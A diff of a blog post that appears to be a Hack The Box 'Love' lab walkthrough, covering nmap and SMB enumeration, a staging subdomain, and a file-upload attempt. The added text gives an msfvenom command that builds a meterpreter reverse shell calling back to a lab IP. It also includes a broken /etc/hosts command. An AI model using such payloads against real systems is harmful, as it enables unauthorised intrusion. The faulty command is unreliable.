@@ -38,9 +38,9 @@ We'll start with the usual TCP scan and the flags *-sV* to have a verbose output
 ![nmap]({{https://jsom1.github.io/}}/_images/htb_love_nmap2.png)
 </div>
 
-That's a lengthy output! There's a web server on port 80, MSRPC on port 135, SMB on ports 139 and 445, https on port 443, MySQL (MariaDB) on port 3306 and finally another https on port 5000.\\
+That's a lengthy output! This is often the case on Windows boxes... There's a web server on port 80, MSRPC on port 135, SMB on ports 139 and 445, https on port 443, MySQL (MariaDB) on port 3306 and finally another https on port 5000.\\
 The scripts provide some information about SMB, such as the host's OS and the computer name on the network.\\
-We will start by the simplest, that is browsing to the box' web page. The second thing we'll investigate is SMB.
+We will start by the simplest, that is browsing to the box' web page. The second thing we'll do is enumerate SMB.
 
 ## 2. Find and exploit vulnerabilities
 {:style="color:DarkRed; font-size: 170%;"}
@@ -131,16 +131,51 @@ That could be interesting later. Even though we find nothing on SMB, let's use a
 ![enum4linux]({{https://jsom1.github.io/}}/_images/htb_love_enum4l.png)
 </div>
 
-Of course it failed early... We get a useful information though: the server doesn't alllow null sessions. Since this latter is often a necessary condition for expoitation, enu4linux aborted the rest of the scan.
+Of course it failed early... We get a useful information though: the server doesn't alllow null sessions. Since this latter is often a necessary condition for expoitation, enu4linux aborted the rest of the scan.\\
+SMB doesn't look to be our way in... 
 
-We might not have discovered anything, but
+Let's get back at the initial nmap scan to figure out our next move. 
+I realize I may have overlooked something about http and didn't enumerate it properly. In particular, it's the first time I see "PHPSESSID: httponly flag not set". A quick search reveals that this indicates to the browser that the cookie can be accessed by client-side scripts. We'll check that, and also the versions of httpd (2.4.46) and php (7.3.27). Nothing there...\\
+After re-rereading nmap's output, there's something I didn't see:
 
+<div class="img_container">
+![I'm blind]({{https://jsom1.github.io/}}/_images/htb_love_blind.png)
+</div>
 
+We add this host to our host file:
 
+````
+sudo echo '10.10.10.239 staging.love.htb >> /etc/hosts
+`````
 
+And browse to it:
+
+<div class="img_container">
+![site 2]({{https://jsom1.github.io/}}/_images/htb_love_site2.png){: height="415px" width = 625px"}
+</div>
+
+Ther's not much on the home page, but here's the *Demo* tab:
+
+<div class="img_container">
+![site 3]({{https://jsom1.github.io/}}/_images/htb_love_site3.png)
+</div>
+
+Let's try to upload a file. I'll start a web server on Kali and try to download Linpeas.sh from the server (just to see what happens):
+
+<div class="img_container">
+![upload]({{https://jsom1.github.io/}}/_images/htb_love_upload.png)
+</div>
+
+I'm not sure about what it does exactly... Does it execute it? If it does, we could easily get a reverse shell... Being able to upload remote files on a server is called a **RFI** (remote file inclusion) vulnerability. Let's upload someething simpler to understand how it works. Atfter many tries, I used *msfvenom* to create a reverse shell with the following syntax:
+
+````
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > test.exe
+`````
+
+I then started a *multi/handler* and uploaded the file on the server. En error message appears: "This program cannot be run in DOS mode.". I Googled it and it appears this error occurs when we try to run a program intended for Windows inside DOS. DOS (Disk Operating System) is an OS that runs from a hard disk drive. It can also refer to a particular family of disk OS, most commonly MS-DOS (Microsoft-DOS).\\
 
 
 <ins>**My thoughts**</ins>
  
-SMB enumeration didn't bring anything useful but was a great opportunity to practice it.
+As usual, many rabbit holes. SMB enumeration didn't bring anything useful but was a great opportunity to practice it.
 
